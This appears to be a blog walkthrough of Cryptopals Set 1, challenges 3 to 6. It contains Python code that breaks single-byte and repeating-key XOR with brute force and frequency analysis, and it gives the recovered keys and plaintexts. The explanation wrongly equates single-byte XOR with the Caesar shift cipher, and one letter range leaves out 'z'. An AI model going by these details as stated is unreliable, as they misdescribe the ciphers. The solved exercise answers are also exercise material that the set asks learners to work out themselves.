<p><strong>Monoalphabetic Cipher</strong> is a substitution cipher in which for a given key, the cipher alphabet for each plain alphabet is fixed throughout the encryption process.</p>
<p><img src="/Cryptopals_Set_1/6_image.png" alt="&ldquo;xor_shift&rdquo;">
<em>Replace each plaintext letter with a different one a fixed number of places down the alphabet.</em></p>
<p>For example, if &lsquo;A&rsquo; is encrypted as &lsquo;D&rsquo;, for any number of occurrence in that plaintext, &lsquo;A&rsquo; will always get encrypted to &lsquo;D&rsquo;.</p>
<p><strong>Single-byte Xor</strong>, as the name suggests, is when a string is xored with a single byte throughout.<br>
It&rsquo;s also known as Caesar cipher or shift cipher, it is one of the simplest and most widely known encryption techniques.<br>
It is a type of substitution cipher in which each letter in the plaintext is replaced by a letter some fixed number of positions down the alphabet.<br>
For example, with a left shift of 3, D would be replaced by A, E would become B, and so on.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> zip_longest
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
hex_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#34;</span>
</code></pre></div><p>Use either of the functions to brute force the single byte xor key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">single_byte_xor_letters</span>(ciphertext: bytes) <span style="color:#f92672">-&gt;</span> dict:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Performs xor between every possible key uptil 256 and returns the key that gives the most ascii characters.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    ascii_text_chars <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">122</span>)) <span style="color:#f92672">+</span> [<span style="color:#ae81ff">32</span>]
    best_candidate <span style="color:#f92672">=</span> None
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">8</span>): <span style="color:#75715e"># for every possible key</span>
        
        <span style="color:#75715e"># converting the key from a number to a byte</span>
        candidate_key <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
        keystream <span style="color:#f92672">=</span> candidate_key<span style="color:#f92672">*</span>len(ciphertext)
        
        candidate_message <span style="color:#f92672">=</span> bytes([x<span style="color:#f92672">^</span>y <span style="color:#66d9ef">for</span> (x, y) <span style="color:#f92672">in</span> zip(ciphertext, keystream)])
        nb_letters <span style="color:#f92672">=</span> sum([ x <span style="color:#f92672">in</span> ascii_text_chars <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> candidate_message])
        
        <span style="color:#75715e"># if the obtained message has more letters than any other candidate before</span>
        <span style="color:#66d9ef">if</span> best_candidate <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> nb_letters <span style="color:#f92672">&gt;</span> best_candidate[<span style="color:#e6db74">&#34;nb_letters&#34;</span>]:
            <span style="color:#75715e"># store the current key and message as our best candidate so far</span>
            best_candidate <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;message&#34;</span>: candidate_message<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>), <span style="color:#e6db74">&#34;nb_letters&#34;</span>: nb_letters, <span style="color:#e6db74">&#34;key&#34;</span>: candidate_key}
    
    <span style="color:#66d9ef">return</span> best_candidate
</code></pre></div><p><strong>Frequency Analysis</strong> consists of counting the occurrence of each letter in a text.<br>
It is based on the fact that, in any given piece of text, certain letters and combinations of letters occur with varying frequencies.<br>
For instance, given a section of English language, some letters are common, while some letters are not as frequently used.</p>
<p>When trying to decrypt a cipher text based on a substitution cipher, we can use a frequency analysis to help identify the most recurring letters in a cipher text and hence make hypothesis of what these letters have been encoded as.<br>
This will help us decrypt some of the letters in the text. We can then recognise patterns/words in the partly decoded text to identify more substitutions.</p>
<p><img src="/Cryptopals_Set_1/7_image.png" alt="&ldquo;frequency_distribution&rdquo;">
<em>Frequency distribution.</em></p>
<p>We can then use the property A ⊕ ( B ⊕ A ) = B, and xor the encrypted string with the key drawn from hypothesis (from the frequency analysis) to get the original message back.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_score</span>(text: str) <span style="color:#f92672">-&gt;</span> float:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Calculates score of the given text based on a frequency chart of english alphabets.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Block for frequency analysis</span>
    frequency_chart <span style="color:#f92672">=</span> {
        <span style="color:#e6db74">&#39;E&#39;</span>: <span style="color:#ae81ff">12.70</span>, <span style="color:#e6db74">&#39;T&#39;</span>: <span style="color:#ae81ff">9.06</span>, <span style="color:#e6db74">&#39;A&#39;</span>: <span style="color:#ae81ff">8.17</span>, <span style="color:#e6db74">&#39;O&#39;</span>: <span style="color:#ae81ff">7.51</span>, <span style="color:#e6db74">&#39;I&#39;</span>: <span style="color:#ae81ff">6.97</span>, <span style="color:#e6db74">&#39;N&#39;</span>: <span style="color:#ae81ff">6.75</span>, <span style="color:#e6db74">&#39;S&#39;</span>: <span style="color:#ae81ff">6.33</span>, <span style="color:#e6db74">&#39;H&#39;</span>: <span style="color:#ae81ff">6.09</span>, 
        <span style="color:#e6db74">&#39;R&#39;</span>: <span style="color:#ae81ff">5.99</span>, <span style="color:#e6db74">&#39;D&#39;</span>: <span style="color:#ae81ff">4.25</span>, <span style="color:#e6db74">&#39;L&#39;</span>: <span style="color:#ae81ff">4.03</span>, <span style="color:#e6db74">&#39;C&#39;</span>: <span style="color:#ae81ff">2.78</span>, <span style="color:#e6db74">&#39;U&#39;</span>: <span style="color:#ae81ff">2.76</span>, <span style="color:#e6db74">&#39;M&#39;</span>: <span style="color:#ae81ff">2.41</span>, <span style="color:#e6db74">&#39;W&#39;</span>: <span style="color:#ae81ff">2.36</span>, <span style="color:#e6db74">&#39;F&#39;</span>: <span style="color:#ae81ff">2.23</span>,
        <span style="color:#e6db74">&#39;G&#39;</span>: <span style="color:#ae81ff">2.02</span>, <span style="color:#e6db74">&#39;Y&#39;</span>: <span style="color:#ae81ff">1.97</span>, <span style="color:#e6db74">&#39;P&#39;</span>: <span style="color:#ae81ff">1.93</span>, <span style="color:#e6db74">&#39;B&#39;</span>: <span style="color:#ae81ff">1.29</span>, <span style="color:#e6db74">&#39;V&#39;</span>: <span style="color:#ae81ff">0.98</span>, <span style="color:#e6db74">&#39;K&#39;</span>: <span style="color:#ae81ff">0.77</span>, <span style="color:#e6db74">&#39;J&#39;</span>: <span style="color:#ae81ff">0.15</span>,
        <span style="color:#e6db74">&#39;X&#39;</span>: <span style="color:#ae81ff">0.15</span>, <span style="color:#e6db74">&#39;Q&#39;</span>: <span style="color:#ae81ff">0.10</span>, <span style="color:#e6db74">&#39;Z&#39;</span>: <span style="color:#ae81ff">0.07</span>, <span style="color:#e6db74">&#39; &#39;</span>: <span style="color:#ae81ff">35</span>
    }
    
    score <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
    <span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> text<span style="color:#f92672">.</span>upper():
        score <span style="color:#f92672">+=</span> frequency_chart<span style="color:#f92672">.</span>get(letter, <span style="color:#ae81ff">0</span>)
    <span style="color:#66d9ef">return</span> score

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">single_byte_xor_score</span>(ciphertext: bytes) <span style="color:#f92672">-&gt;</span> dict:
    max_score <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#66d9ef">for</span> testkey <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
        testtext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> ciphertext:
            testtext <span style="color:#f92672">+=</span> chr(letter <span style="color:#f92672">^</span> testkey)
        
        cur_score <span style="color:#f92672">=</span> calculate_score(testtext)
        <span style="color:#66d9ef">if</span> cur_score <span style="color:#f92672">&gt;</span> max_score:
            max_score <span style="color:#f92672">=</span> cur_score
            key <span style="color:#f92672">=</span> chr(testkey)
            plaintext <span style="color:#f92672">=</span> testtext
            
    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;score&#34;</span> : max_score, <span style="color:#e6db74">&#34;key&#34;</span> : key, <span style="color:#e6db74">&#34;message&#34;</span> : plaintext}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_string)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Using scoring technique...&#34;</span>)
single_byte_xor_score(byte_string)[<span style="color:#e6db74">&#39;message&#39;</span>]
</code></pre></div><p>Using scoring technique&hellip;<br>
&ldquo;Cooking MC&rsquo;s like a pound of bacon&rdquo;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Using ASCII counting technique...&#34;</span>)
single_byte_xor_letters(byte_string)[<span style="color:#e6db74">&#39;message&#39;</span>]
</code></pre></div><p>Using ASCII counting technique&hellip;<br>
&ldquo;Cooking MC&rsquo;s like a pound of bacon&rdquo;</p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-4-detect-single-character-xor">Challenge 4: Detect single-character XOR</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/4">Link</a></p>
<blockquote>
<p>One of the 60-character strings in this <a href="https://cryptopals.com/static/challenge-data/4.txt">file</a> has been encrypted by single-character XOR.<br>
Find it.<br>
(Your code from #3 should help.)</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
inf <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;4.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
hex_data <span style="color:#f92672">=</span> inf<span style="color:#f92672">.</span>read()

<span style="color:#75715e"># Creates a list of lines taken from the file.</span>
byte_strings <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> hex_data<span style="color:#f92672">.</span>split():
    byte_line <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(line)
    byte_strings<span style="color:#f92672">.</span>append(byte_line)
</code></pre></div><p>Same as before, only difference being that a list of encrypted strings are obtained from a file, and their scores are compared amongst them too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
max_score <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

<span style="color:#75715e"># Runs the previous code against all lines in the file.</span>
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> byte_strings:
    result <span style="color:#f92672">=</span> single_byte_xor_score(line)
    cur_score <span style="color:#f92672">=</span> result[<span style="color:#e6db74">&#34;score&#34;</span>]
    testtext <span style="color:#f92672">=</span> result[<span style="color:#e6db74">&#34;message&#34;</span>]
    <span style="color:#66d9ef">if</span> cur_score <span style="color:#f92672">&gt;</span> max_score:
        max_score <span style="color:#f92672">=</span> cur_score
        plaintext <span style="color:#f92672">=</span> testtext

plaintext
</code></pre></div><p>&lsquo;Now that the party is jumping\n&rsquo;</p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-5-implement-repeating-key-xor">Challenge 5: Implement repeating-key XOR</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/5">Link</a></p>
<blockquote>
<p>Here is the opening stanza of an important work of the English language:<br>
<strong>Burning &lsquo;em, if you ain&rsquo;t quick and nimble</strong><br>
<strong>I go crazy when I hear a cymbal</strong><br>
Encrypt it, under the key <strong>ICE</strong>, using repeating-key XOR.<br>
In repeating-key XOR, you&rsquo;ll sequentially apply each byte of the key; the first byte of plaintext will be XOR&rsquo;d against I, the next C, the next E, then I again for the 4th byte, and so on.<br>
It should come out to:<br>
<strong>0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272</strong><br>
<strong>a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</strong> Encrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it.<br>
I promise, we aren&rsquo;t wasting your time with this.</p>
</blockquote>
<p><strong>Polyalphabetic Cipher</strong> is a substitution cipher in which the cipher alphabet for the plain alphabet may be different at different places during the encryption process.</p>
<p><img src="/Cryptopals_Set_1/8_image.png" alt="&ldquo;vignere_square&rdquo;">
<em>Vigenère square.</em></p>
<p><strong>Vigenère Cipher</strong> uses a Vigenère square or Vigenère table, having the alphabets written out 26 times in different rows, each alphabet shifted cyclically to the left compared to the previous alphabet, corresponding to the 26 possible Caesar ciphers.<br>
At different points in the encryption process, the cipher uses a different alphabet from one of the rows. The alphabet used at each point depends on a repeating keyword.</p>
<p><strong>Repeating XOR Cipher</strong> is where the key is shorter than the message and the key is duplicated/repeated letter-for-letter in order to cover the whole message. Then each byte of the plain text is xored with each according byte of the key. It&rsquo;s a variant of Vigenère Cipher where the encryption is xor.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Burning &#39;em, if you ain&#39;t quick and nimble</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">I go crazy when I hear a cymbal&#34;</span>
key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ICE&#34;</span>
target_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">repeated_xor</span>(text: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Performs xor between given text and key. If the length is unequal, key repeats.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    quotient, remainder <span style="color:#f92672">=</span> divmod(len(text), len(key))
    <span style="color:#66d9ef">return</span> bytes([x <span style="color:#f92672">^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(text, bytes(key <span style="color:#f92672">*</span> quotient <span style="color:#f92672">+</span> key[:remainder]))])
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> plaintext<span style="color:#f92672">.</span>encode()
bytekey <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>encode()
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ciphertext <span style="color:#f92672">=</span> repeated_xor(byte_string, bytekey)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">assert</span> target_string <span style="color:#f92672">==</span> ciphertext<span style="color:#f92672">.</span>hex()
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-6-break-repeating-key-xor">Challenge 6: Break repeating-key XOR</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/6">Link</a></p>
<blockquote>
<p><a href="https://cryptopals.com/static/challenge-data/6.txt">There&rsquo;s a file</a> here. It&rsquo;s been base64&rsquo;d after being encrypted with repeating-key XOR.<br>
Decrypt it.<br>
Here&rsquo;s how:</p>
</blockquote>
<ol>
<li>Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40.</li>
<li>Write a function to compute the edit distance/Hamming distance between two strings. The Hamming distance is just the number of differing bits. The distance between:<br>
<strong>this is a test</strong><br>
and<br>
<strong>wokka wokka!!!</strong><br>
is 37. Make sure your code agrees before you proceed.</li>
<li>For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them.<br>
Normalize this result by dividing by KEYSIZE.</li>
<li>The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values.<br>
Or take 4 KEYSIZE blocks instead of 2 and average the distances.</li>
<li>Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length.</li>
<li>Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on.</li>
<li>Solve each block as if it was single-character XOR. You already have code to do this.</li>
<li>For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block.<br>
Put them together and you have the key.<br>
This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (&ldquo;Vigenere&rdquo;) statistically is obviously an academic exercise, a &ldquo;Crypto 101&rdquo; thing. But more people &ldquo;know how&rdquo; to break it than can actually break it, and a similar technique breaks something much more important.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
inf <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;6.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
b64_data <span style="color:#f92672">=</span> inf<span style="color:#f92672">.</span>read()

byte_data <span style="color:#f92672">=</span> b64decode(b64_data)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hamming_distance</span>(text1: bytes, text2: bytes) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Calculates the Hamming Distance between the given byte strings.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    distance <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    
    dec_list <span style="color:#f92672">=</span> [b1 <span style="color:#f92672">^</span> b2 <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(text1, text2)]
    <span style="color:#66d9ef">for</span> decimal <span style="color:#f92672">in</span> dec_list:
        distance <span style="color:#f92672">+=</span> bin(decimal)<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;1&#34;</span>)
        
    <span style="color:#66d9ef">if</span> len(text1) <span style="color:#f92672">&gt;</span> len(text2):
        diff <span style="color:#f92672">=</span> len(text1) <span style="color:#f92672">-</span> len(text2)
        text <span style="color:#f92672">=</span> text1
    <span style="color:#66d9ef">else</span>:
        diff <span style="color:#f92672">=</span> len(text2) <span style="color:#f92672">-</span> len(text1)
        text <span style="color:#f92672">=</span> text2
        
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, diff<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
        distance <span style="color:#f92672">+=</span> bin(text[<span style="color:#f92672">-</span>i])<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#34;1&#34;</span>)
        
    <span style="color:#66d9ef">return</span> distance
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">break_repeated_xor_keysize</span>(ciphertext: bytes) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Approximates the keysize based on the hamming distance between different blocks of ciphertexts.
</span><span style="color:#e6db74">    Returns the keysize with least hamming distance between consecutive sets of ciphertext.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    min_distance <span style="color:#f92672">=</span> <span style="color:#ae81ff">100000</span>
    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">41</span>):
        edit_distance <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        blocks <span style="color:#f92672">=</span> [ciphertext[i<span style="color:#f92672">*</span>key:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>key] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)]
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(blocks)):
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(blocks)):
                edit_distance <span style="color:#f92672">+=</span> hamming_distance(blocks[i], blocks[j])
        
        normalized_distance <span style="color:#f92672">=</span> edit_distance<span style="color:#f92672">/</span>key
        
        <span style="color:#66d9ef">if</span> normalized_distance <span style="color:#f92672">&lt;</span> min_distance:
            min_distance <span style="color:#f92672">=</span> normalized_distance
            keysize <span style="color:#f92672">=</span> key
    
    <span style="color:#66d9ef">return</span> keysize
</code></pre></div><p>Creates blocks of ciphertext in preparation of brute forcing the xor keysize.
When we have the key length, we can group together ciphertext bytes that share the same key byte.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> break_repeated_xor_keysize(byte_data)
cipher_blocks <span style="color:#f92672">=</span> [byte_data[i:i<span style="color:#f92672">+</span>keysize] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(byte_data), keysize)]

<span style="color:#75715e">#To remove the last block with less characters.</span>
cipher_blocks<span style="color:#f92672">.</span>pop()
cipher_block_size <span style="color:#f92672">=</span> len(cipher_blocks[<span style="color:#ae81ff">0</span>])
</code></pre></div><p>Brute force the key, one letter at a time.<br>
A repeating key means that the letters at a fixed interval will be xored with the same value, that is, for a 4 byte key, a letter at every 4th position will be xored with the same letter of the key.</p>
<p><img src="/Cryptopals_Set_1/1_image.png" alt="&ldquo;block_bytes&rdquo;">
<em>Blocks of bytes at set intervals.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, cipher_block_size):
    single_xor_block <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#75715e"># Construct blocks out of a fixed index from all cipher blocks.</span>
    <span style="color:#66d9ef">for</span> block <span style="color:#f92672">in</span> cipher_blocks:
        single_xor_block <span style="color:#f92672">+=</span> (block[i])<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
        
    <span style="color:#75715e"># Apply frequency analysis to the block associated with this index.</span>
    result <span style="color:#f92672">=</span> single_byte_xor_score(single_xor_block)
    testkey <span style="color:#f92672">=</span> result[<span style="color:#e6db74">&#34;key&#34;</span>]
    key <span style="color:#f92672">+=</span> testkey
key
</code></pre></div><p>&lsquo;Terminator X: Bring the noise&rsquo;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">plaintext <span style="color:#f92672">=</span> repeated_xor(byte_data, key<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
<span style="color:#66d9ef">print</span>(plaintext<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
</code></pre></div><p>I&rsquo;m back and I&rsquo;m ringin&rsquo; the bell 
A rockin&rsquo; on the mike while the fly girls yell 
In ecstasy in the back of me 
Well that&rsquo;s my DJ Deshay cuttin&rsquo; all them Z&rsquo;s 
Hittin&rsquo; hard and the girlies goin&rsquo; crazy 
Vanilla&rsquo;s on the mike, man I&rsquo;m not lazy.</p>
<p>I&rsquo;m lettin&rsquo; my drug kick in 
It controls my mouth and I begin 
To just let it flow, let my concepts go 
My posse&rsquo;s to the side yellin&rsquo;, Go Vanilla Go!</p>
<p>Smooth &lsquo;cause that&rsquo;s the way I will be 
And if you don&rsquo;t give a damn, then 
Why you starin&rsquo; at me 
So get off &lsquo;cause I control the stage 
There&rsquo;s no dissin&rsquo; allowed 
I&rsquo;m in my own phase 
The girlies sa y they love me and that is ok 
And I can dance better than any kid n&rsquo; play</p>
<p>Stage 2 &ndash; Yea the one ya&rsquo; wanna listen to 
It&rsquo;s off my head so let the beat play through 
So I can funk it up and make it sound good 
1-2-3 Yo &ndash; Knock on some wood 
For good luck, I like my rhymes atrocious 
Supercalafragilisticexpialidocious 
I&rsquo;m an effect and that you can bet 
I can take a fly girl and make her wet.</p>
<p>I&rsquo;m like Samson &ndash; Samson to Delilah 
There&rsquo;s no denyin&rsquo;, You can try to hang 
But you&rsquo;ll keep tryin&rsquo; to get my style 
Over and over, practice makes perfect 
But not if you&rsquo;re a loafer.</p>
<p>You&rsquo;ll get nowhere, no place, no time, no girls 
Soon &ndash; Oh my God, homebody, you probably eat 
Spaghetti with a spoon! Come on and say it!</p>
<p>VIP. Vanilla Ice yep, yep, I&rsquo;m comin&rsquo; hard like a rhino 
Intoxicating so you stagger like a wino 
So punks stop trying and girl stop cryin&rsquo; 
Vanilla Ice is sellin&rsquo; and you people are buyin&rsquo; 
&lsquo;Cause why the freaks are jockin&rsquo; like Crazy Glue 
Movin&rsquo; and groovin&rsquo; trying to sing along 
All through the ghetto groovin&rsquo; this here song 
Now you&rsquo;re amazed by the VIP posse.</p>
<p>Steppin&rsquo; so hard like a German Nazi 
Startled by the bases hittin&rsquo; ground 
There&rsquo;s no trippin&rsquo; on mine, I&rsquo;m just gettin&rsquo; down 
Sparkamatic, I&rsquo;m hangin&rsquo; tight like a fanatic 
You trapped me once and I thought that 
You might have it 
So step down and lend me your ear 
&lsquo;89 in my time! You, &lsquo;90 is my year.</p>
<p>You&rsquo;re weakenin&rsquo; fast, YO! and I can tell it 
Your body&rsquo;s gettin&rsquo; hot, so, so I can smell it 
So don&rsquo;t be mad and don&rsquo;t be sad 
&lsquo;Cause the lyrics belong to ICE, You can call me Dad 
You&rsquo;re pitchin&rsquo; a fit, so step back and endure 
Let the witch doctor, Ice, do the dance to cure 
So come up close and don&rsquo;t be square 
You wanna battle me &ndash; Anytime, anywhere</p>
<p>You thought that I was weak, Boy, you&rsquo;re dead wrong 
So come on, everybody and sing this song</p>
<p>Say &ndash; Play that funky music Say, go white boy, go white boy go 
play that funky music Go white boy, go white boy, go 
Lay down and boogie and play that funky music till you die.</p>
<p>Play that funky music Come on, Come on, let me hear 
Play that funky music white boy you say it, say it 
Play that funky music A little louder now 
Play that funky music, white boy Come on, Come on, Come on 
Play that funky music</p>
